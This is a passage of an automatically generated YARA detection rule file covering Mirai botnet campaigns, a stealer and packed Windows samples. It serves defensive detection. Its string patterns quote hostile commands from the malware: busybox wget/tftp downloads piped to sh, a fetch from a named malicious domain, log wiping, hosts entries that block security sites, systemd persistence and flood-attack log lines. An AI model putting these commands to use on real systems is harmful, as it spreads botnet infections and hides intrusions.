        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s1 = "systemctl daemon-reload 2>/dev/null; systemctl enable killer-helper.service 2>/dev/null" ascii
        $s2 = "journalctl --rotate --vacuum-time=1s 2>/dev/null" ascii
        $s3 = "/etc/systemd/system/killer-helper.service" ascii
        $s4 = "Accept-Language: en-US,en;q=0.5" ascii
        $s5 = "Accept-Encoding: gzip, deflate" ascii
        $s6 = "0.0.0.0 www.hybrid-analysis.com" ascii
        $s7 = "PATH=/usr/sbin:/usr/bin:/sbin:/bin" ascii
        $s8 = "/usr/lib/systemd/.system-helper" ascii
        $s9 = "0.0.0.0 hybrid-analysis.com" ascii
        $s10 = "0.0.0.0 www.malwarebytes.com" ascii
        $s11 = "Description=System Helper" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1d67764a_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1d67764a"
        date = "2026-10-17"
        campaign = "tlsh-1d67764a"
        family = "mirai"
        hash = "01c97268134bd3bcb04f32567f2c8b5fa2aafab4f268e7ce70ae3731566133bf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1d67764a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s1 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s2 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
        $s3 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s4 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s5 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s6 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s7 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s8 = "%s: Symbol `%s' causes overflow in R_X86_64_PC32 relocation" ascii
        $s9 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s10 = "ELFW(R_TYPE) (reloc->r_info) == R_X86_64_RELATIVE" ascii
        $s11 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2536224 and 12 of them
}

rule Sightlines_tlsh_f43f7a27_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f43f7a27"
        date = "2026-10-17"
        campaign = "tlsh-f43f7a27"
        family = "mirai"
        hash = "3073ae4acf3b53b19827c40da8f3d79c5d884adca5c9858aadb1ea4ce187f3a3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f43f7a27.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s1 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s2 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s3 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s4 = "_dl_debug_initialize (0, args.nsid)->r_state == RT_CONSISTENT" ascii
        $s5 = "_dl_debug_initialize (0, args->nsid)->r_state == RT_CONSISTENT" ascii
        $s6 = "INTERNAL_SYSCALL_ERRNO (e, __err) != EDEADLK || (kind != PTHREAD_MUTEX_ERRORCHECK_NP && kind != PTHR" ascii
        $s7 = "conf->nameserver_list[i]->sa_family == AF_INET6" ascii
        $s8 = "lead_zero <= (base == 16 ? (uintmax_t) INTMAX_MAX / 4 : (uintmax_t) INTMAX_MAX)" ascii
        $s9 = "Filters not supported with LD_TRACE_PRELINKING" ascii
        $s10 = "curl -s -o /dev/null --max-time 15 -w '%{speed_download} %{size_download}' 'https://speed.cloudflare" ascii
        $s11 = "chunksize_nomask (p) == (0 | PREV_INUSE)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1394192 and 12 of them
}

rule Sightlines_tlsh_a5032f4d_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a5032f4d"
        date = "2026-10-17"
        campaign = "tlsh-a5032f4d"
        family = "mirai"
        hash = "285037bfb99b2dbf6376998f11f31623965af6ff7128c811c67619b3838014fe"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a5032f4d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/proc/self/oom_score_adj" ascii
        $s1 = "/etc/config/resolv.conf" ascii
        $s2 = "/etc/config/hosts" ascii
        $s3 = "Restart=always" ascii
        $s4 = "[kworker/0:1]" ascii
        $s5 = "ExecStart=%s" ascii
        $s6 = "/etc/rc.local" ascii
        $s7 = "[Service]" ascii
        $s8 = "E8H;E0wrH" ascii
        $s9 = "tcpbypass" ascii
        $s10 = "AWAVAUATUL" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 7 of them
}

rule Sightlines_tlsh_a8fb433e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a8fb433e"
        date = "2026-10-17"
        campaign = "tlsh-a8fb433e"
        family = "mirai"
        hash = "461a6656985236f99a5df315ccef2f79c80a5d31e70cf8cd6cae32351738ea73"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a8fb433e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "mHoIJPqGRSTUVWXL\\s]Yrp|{nzt[D&'()*+,-./0123456789:;<=@A%$FuvwxyE}~l" ascii
        $s1 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s2 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s3 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s4 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s5 = "Content-Type: application/json" ascii
        $s6 = "GET /api/v1/status HTTP/1.1" ascii
        $s7 = "/bin/busybox wget http://" ascii
        $s8 = "POST /api/sync HTTP/1.1" ascii
        $s9 = "/bin/busybox echo -ne " ascii
        $s10 = "/bin/busybox echo > " ascii
        $s11 = "Host: api.svc.local" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_f025a3f4_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f025a3f4"
        date = "2026-10-17"
        campaign = "tlsh-f025a3f4"
        family = "mirai"
        hash = "2538c962c062638c7ab2562195254a605dc34894c341bf41f2e1b1e388d76d14"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f025a3f4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "busybox tftp -g -r %s -l q wemqmewkqewq.work.gd" ascii
        $s2 = "wget -O q http://wemqmewkqewq.work.gd/%s" ascii
        $s3 = "Accept-Encoding: gzip, deflate, br" ascii
        $s4 = "Accept-Language: en-US,en;q=0.9" ascii
        $s5 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3" ascii
        $s6 = "fw start m=%s dst=%u port=%u ms=%u" ascii
        $s7 = "SSH-2.0-OpenSSH_9.2p1 Debian-2" ascii
        $s8 = "socks4://109.107.166.207:30385" ascii
        $s9 = "socks4://185.196.178.238:60606" ascii
        $s10 = "socks4://159.224.243.185:61303" ascii
        $s11 = "socks4://180.183.149.236:5678" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_host_ad21b9ea_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-ad21b9ea"
        date = "2026-10-17"
        campaign = "host-ad21b9ea"
        family = ""
        hash = "008f232c61601b260e64b458afe00c0b33a69cbd7dfc5b756b312c9723614d1b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-ad21b9ea.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "DCe):hover .VfPpkd-NLUYnc-V67aGc{color:rgb(248,249,250)}.AfoeCd .RnXJS.VfPpkd-O1htCb-OWXEXe-OWB6Me ." ascii
        $s1 = "-NLUYnc-V67aGc{color:rgb(248,249,250)}.AfoeCd .gOPnwc:hover:not(.VfPpkd-fmcmS-yrriRe-OWXEXe-OWB6Me) " ascii
        $s2 = "NLUYnc-V67aGc{color:rgb(248,249,250)}.AfoeCd .UAQDDf.VfPpkd-O1htCb-OWXEXe-OWB6Me .VfPpkd-NLUYnc-V67a" ascii
        $s3 = "XxIAqe-cGMI2b{outline-color:CanvasText}}.EY8ABd .VfPpkd-z59Tgd{background-color:rgb(60,64,67)}.EY8AB" ascii
        $s4 = "VfPpkd-NLUYnc-V67aGc{color:rgba(232,234,237,.38)}.AfoeCd .RnXJS:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me)+.V" ascii
        $s5 = "fmcmS-yrriRe-OWXEXe-OWB6Me) .VfPpkd-NLUYnc-V67aGc{color:rgb(248,249,250)}.AfoeCd .orScbe:not(.VfPpkd" ascii
        $s6 = "-OWXEXe-OWB6Me) .VfPpkd-NLUYnc-V67aGc{color:rgb(248,249,250)}.AfoeCd .Y5O54e .VfPpkd-fmcmS-yrriRe:ho" ascii
        $s7 = "IsBm,1.5rem);letter-spacing:var(--H8HCPd,0);font-weight:var(--Bpk69,400)}.uW2Fw-Sx9Kwc-OWXEXe-vOE8Lb" ascii
        $s8 = "jY41G-V67aGc{color:rgb(174,203,250)}.AfoeCd .FEsNhd.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe.VfPpkd" ascii
        $s9 = "d-RKhZBe-LgbsSe-OWXEXe-gk6SMd:not(:disabled){background-color:rgb(138,180,248)}.AfoeCd .zNgRPc .VfPp" ascii
        $s10 = "r-primary,#0b57d0)}.i79UJc.IYewr.CDELXb .zHQkBf:not([disabled])~.snByac,.i79UJc.IYewr.u3bW4e .zHQkBf" ascii
        $s11 = "(.VfPpkd-fmcmS-yrriRe-OWXEXe-OWB6Me) .VfPpkd-NLUYnc-V67aGc{color:rgb(138,180,248)}.AfoeCd .gOPnwc.Vf" ascii
    condition:
        filesize < 1921538 and 11 of them
}

rule Sightlines_tlsh_0cc9a80f_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0cc9a80f"
        date = "2026-10-17"
        campaign = "tlsh-0cc9a80f"
        family = "mirai"
        hash = "2622a5941e0b53d179e8084fdd72f45b678643269fe9a2833a409cb0debd4006"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0cc9a80f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curl -s -o /dev/null --max-time 15 -w '%{speed_download} %{size_download}' 'https://speed.cloudflare" ascii
        $s1 = "[%s] speedtest: %.2f Mbps down (%.2f MB/s, %.1f MB sample) [curl]" ascii
        $s2 = "[%s] udp_legit: %d threads preset (nproc=%d), size=%d, %ds" ascii
        $s3 = "[%s] arch: pointer=%d-bit, endian=%s, caps: threads=%d discord_socks=%d" ascii
        $s4 = "[%s] start_flood: usage: <mode> <ip> <port> [args]" ascii
        $s5 = "[%s] syn_hs established %d flows (%ld ok, %ld fail), now spewing" ascii
        $s6 = ".com/__down?bytes=10000000' 2>/dev/null" ascii
        $s7 = "command -v speedtest-cli >/dev/null 2>&1" ascii
        $s8 = "[%s] udp_legit worker done: %ld pkts x %d B" ascii
        $s9 = "[%s] udpcustom: sendto failed after %ld pkts: %s" ascii
        $s10 = "[%s] ovhbypass: mode=%s port=%d size=%d burst=%d gap=%dms %ds" ascii
        $s11 = "[%s] udp_legit done: %d threads, %d secs" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_host_2bd4e89d_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-2bd4e89d"
        date = "2026-10-17"
        campaign = "host-2bd4e89d"
        family = "mirai"
        hash = "685d91b7880c6877fc0b5ab0430c503373b4280eca139cb5db2b1d50c176bc85"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-2bd4e89d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "851PGyBc7mdh4L72Viz5f9QggJuAzFTP9JXdvngQJFNh5nwRb8dpNjgWCDDC5T7JJ7HcKoAsRG1JWjkq5HqvcEBYHi1Yq8b" ascii
        $s1 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s2 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s3 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
        $s4 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s5 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s6 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s7 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s8 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s9 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s10 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
        $s11 = "conf->nameserver_list[i]->sa_family == AF_INET6" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2536224 and 9 of them
}

rule Sightlines_host_3c28102e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-3c28102e"
        date = "2026-10-17"
        campaign = "host-3c28102e"
        family = "mirai"
        hash = "685d91b7880c6877fc0b5ab0430c503373b4280eca139cb5db2b1d50c176bc85"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-3c28102e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s1 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s2 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
        $s3 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s4 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s5 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s6 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s7 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
        $s8 = "conf->nameserver_list[i]->sa_family == AF_INET6" ascii
        $s9 = "chunksize_nomask (p) == (0 | PREV_INUSE)" ascii
        $s10 = "robust || (oldval & FUTEX_OWNER_DIED) == 0" ascii
        $s11 = "lead_zero <= (base == 16 ? ((uintmax_t) exponent - (uintmax_t) INTMAX_MIN) / 4 : ((uintmax_t) expone" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2536224 and 12 of them
}

rule Sightlines_tlsh_85cfbe91_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-85cfbe91"
        date = "2026-10-17"
        campaign = "tlsh-85cfbe91"
        family = "mirai"
        hash = "448eefd781b3b6ecee0658169cf957924c985e578af5d94745f1c7460044c637"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-85cfbe91.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "Content-Type: application/json" ascii
        $s5 = "GET /api/v1/status HTTP/1.1" ascii
        $s6 = "/bin/busybox wget http://" ascii
        $s7 = "POST /api/sync HTTP/1.1" ascii
        $s8 = "/bin/busybox echo -ne " ascii
        $s9 = "qVcVf(@Vg= Vhm#Vi}&Vj" ascii
        $s10 = "/bin/busybox echo > " ascii
        $s11 = "Host: api.svc.local" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_93c63586_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-93c63586"
        date = "2026-10-17"
        campaign = "tlsh-93c63586"
        family = "mirai"
        hash = "05fc0e8dc8e4f37ea41415c40052d36b941d2f3a42e59b0b42420089e17107ed"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-93c63586.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "Content-Type: application/json" ascii
        $s5 = "GET /api/v1/status HTTP/1.1" ascii
        $s6 = "/bin/busybox wget http://" ascii
        $s7 = "POST /api/sync HTTP/1.1" ascii
        $s8 = "/bin/busybox echo -ne " ascii
        $s9 = "/bin/busybox echo > " ascii
        $s10 = "Host: api.svc.local" ascii
        $s11 = "KERN_SECURELEVEL" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_a944dfa7_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a944dfa7"
        date = "2026-10-17"
        campaign = "tlsh-a944dfa7"
        family = "mirai"
        hash = "2c7aa6ff95e09f20a1a7421abdeec3019cdb8e66ca93100e8ae9dbca919d7c08"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a944dfa7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "Content-Type: application/json" ascii
        $s5 = "GET /api/v1/status HTTP/1.1" ascii
        $s6 = "/bin/busybox wget http://" ascii
        $s7 = "POST /api/sync HTTP/1.1" ascii
        $s8 = "/bin/busybox echo -ne " ascii
        $s9 = "/bin/busybox echo > " ascii
        $s10 = "Host: api.svc.local" ascii
        $s11 = "KERN_SECURELEVEL" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_877b4cfc_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-877b4cfc"
        date = "2026-10-17"
        campaign = "imphash-877b4cfc"
        family = ""
        hash = "34b78a64d76e3d03455fa25dda4292eea59dea145f0c3f2c2addcb7380ff988b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-877b4cfc.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" ascii
        $s1 = "D:\\Projects\\WinRAR\\SFX\\build\\sfxrar64\\Release\\sfxrar.pdb" ascii
        $s2 = "<style>body{font-family:\"Arial\";font-size:12;}</style>" wide
        $s3 = "JNot enough memory to unpack the archive with %u GB compression dictionary.+64-bit self-extracting m" wide
        $s4 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">" ascii
        $s5 = "<html><head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\"></head>" wide
        $s6 = "    <!--The ID below indicates application support for Windows 8.1 -->" ascii
        $s7 = "<asmv3:application xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s8 = "manually.</li><br><br>8<li>If the destination folder does not exist, it will be2created automaticall" wide
        $s9 = "<description>WinRAR SFX module</description>" ascii
        $s10 = "    <!--The ID below indicates application support for Windows 10 -->" ascii
        $s11 = "    <!--The ID below indicates application support for Windows 7 -->" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 29383750 and 12 of them
}

rule Sightlines_rich_header_hash_c0264faa_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-c0264faa"
        date = "2026-10-17"
        campaign = "rich_header_hash-c0264faa"
        family = ""
        hash = "34b78a64d76e3d03455fa25dda4292eea59dea145f0c3f2c2addcb7380ff988b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-c0264faa.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" ascii
        $s1 = "D:\\Projects\\WinRAR\\SFX\\build\\sfxrar64\\Release\\sfxrar.pdb" ascii
        $s2 = "<style>body{font-family:\"Arial\";font-size:12;}</style>" wide
        $s3 = "JNot enough memory to unpack the archive with %u GB compression dictionary.+64-bit self-extracting m" wide
        $s4 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">" ascii
        $s5 = "<html><head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\"></head>" wide
        $s6 = "    <!--The ID below indicates application support for Windows 8.1 -->" ascii
        $s7 = "<asmv3:application xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s8 = "manually.</li><br><br>8<li>If the destination folder does not exist, it will be2created automaticall" wide
        $s9 = "<description>WinRAR SFX module</description>" ascii
        $s10 = "    <!--The ID below indicates application support for Windows 10 -->" ascii
        $s11 = "    <!--The ID below indicates application support for Windows 7 -->" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 29383750 and 12 of them
}

rule Sightlines_tlsh_01a13d81_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-01a13d81"
        date = "2026-10-17"
        campaign = "tlsh-01a13d81"
        family = ""
        hash = "89dd5e3e026553056d2f2ba0ee40d1de954eb999b76b932645ff3db19ef517c5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-01a13d81.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " inflate 1.2.8 Copyright 1995-2013 Mark Adler " ascii
        $s1 = "Failed to convert pyhome to ANSI (invalid multibyte string)" ascii
        $s2 = "Failed to get address for PyMarshal_ReadObjectFromString" ascii
        $s3 = "Failed to convert pypath to ANSI (invalid multibyte string)" ascii
        $s4 = "PyInstaller: pyi_win32_utils_to_utf8 failed." ascii
        $s5 = "WARNING: file already exists but should not: %s" ascii
        $s6 = "Cannot allocate memory for ARCHIVE_STATUS" ascii
        $s7 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" ascii
        $s8 = "Failed to get address for PyObject_CallFunction" ascii
        $s9 = "Failed to get address for Py_FileSystemDefaultEncoding" ascii
        $s10 = "Failed to get address for PyImport_ExecCodeModule" ascii
        $s11 = "Failed to get address for PyRun_SimpleString" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3817006 and 12 of them
}

rule Sightlines_tlsh_94d4a9d2_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-94d4a9d2"
        date = "2026-10-17"
        campaign = "tlsh-94d4a9d2"
        family = "mirai"
        hash = "121744bba063912b2217e57f3303ea54f0bddf02c139e713527207dd2eafe5a4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-94d4a9d2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "Content-Type: application/json" ascii
        $s5 = "GET /api/v1/status HTTP/1.1" ascii
        $s6 = "/bin/busybox wget http://" ascii
        $s7 = "POST /api/sync HTTP/1.1" ascii
        $s8 = "/bin/busybox echo -ne " ascii
        $s9 = "/bin/busybox echo > " ascii
        $s10 = "Host: api.svc.local" ascii
        $s11 = "GET %s HTTP/1.0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_fc20c6bb_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fc20c6bb"
        date = "2026-10-17"
        campaign = "tlsh-fc20c6bb"
        family = "mirai"
        hash = "5e04ffbc4d8322f216036037621eb0b32b82060a043901431003ef5ebe7dd35b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fc20c6bb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "Content-Type: application/json" ascii
        $s5 = "GET /api/v1/status HTTP/1.1" ascii
        $s6 = "/bin/busybox wget http://" ascii
        $s7 = "POST /api/sync HTTP/1.1" ascii
        $s8 = "/bin/busybox echo -ne " ascii
        $s9 = "/bin/busybox echo > " ascii
        $s10 = "Host: api.svc.local" ascii
        $s11 = "KERN_SECURELEVEL" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_signer_cert_sha1_591b34e9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-591b34e9"
        date = "2026-10-17"
        campaign = "signer_cert_sha1-591b34e9"
        family = ""
        hash = "00436a440caaf87f038abf67f023658b8e17be98ded878fe0bc24a5d47bddbd8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-591b34e9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "http://sf.symcb.com/sf.crt0" ascii
        $s1 = "https://d.symcb.com/rpa0" ascii
        $s2 = "http://sf.symcd.com0&" ascii
        $s3 = "201230235959Z0^1" ascii
        $s4 = "201229235959Z0b1" ascii
        $s5 = "Western Cape1" ascii
        $s6 = "Durbanville1" ascii
        $s7 = "image/gif0!0" ascii
        $s8 = "200207235959Z0" ascii
        $s9 = "121018000000Z" ascii
        $s10 = "100208000000Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 8594400 and 5 of them
}

rule Sightlines_tlsh_95091757_remusstealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-95091757"
        date = "2026-10-17"
        campaign = "tlsh-95091757"
        family = "remusstealer"
        hash = "00436a440caaf87f038abf67f023658b8e17be98ded878fe0bc24a5d47bddbd8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-95091757.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Set Size Exceeded.*Error on call Winsock2 library function %s&Error on loading Winsock2 library (%s)" wide
        $s1 = "Bits index out of range*Can't write to a read-only resource streamECheckSynchronize called from thre" wide
        $s2 = "List index out of bounds (%d)+Out of memory while expanding memory stream" wide
        $s3 = "%s5Could not convert variant of type (%s) into type (%s)=Overflow while converting variant of type (" wide
        $s4 = "Invalid property value List capacity out of bounds (%d)" wide
        $s5 = "No help found for %s#No context-sensitive help installed$No topic-based help system installed" wide
        $s6 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x" ascii
        $s7 = "%s.Seek not implemented$Operation not allowed on sorted list$%s not in a class registration group" wide
        $s8 = "Invalid stream format$''%s'' is not a valid component name" wide
        $s9 = "Invalid variant operation%Invalid variant operation (%s%.8x)" wide
        $s10 = " - Dock zone has no control\"Unable to find a Table of Contents" wide
        $s11 = "l16 tI6(lA60TY68LQ6@Ti6HLa6P4y6X,q6`4" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1327648 and 12 of them
}

rule Sightlines_tlsh_9a190578_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9a190578"
        date = "2026-10-17"
        campaign = "tlsh-9a190578"
        family = ""
        hash = "35b6d246c01a94f6473a6764923f596ed9c415e1b49402711f453bc7364ff114"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9a190578.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "O(H;y udH" ascii
        $s1 = "S(H9S s8L" ascii
        $s2 = "G(H9G s2L" ascii
        $s3 = "K(H9K s7H" ascii
        $s4 = "F(H9F r&" ascii
        $s5 = "S@H+S8H9" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 6 of them
}

rule Sightlines_tlsh_01d19110_prometei
{
    meta:
        author = "Sightlines (automatically generated)"
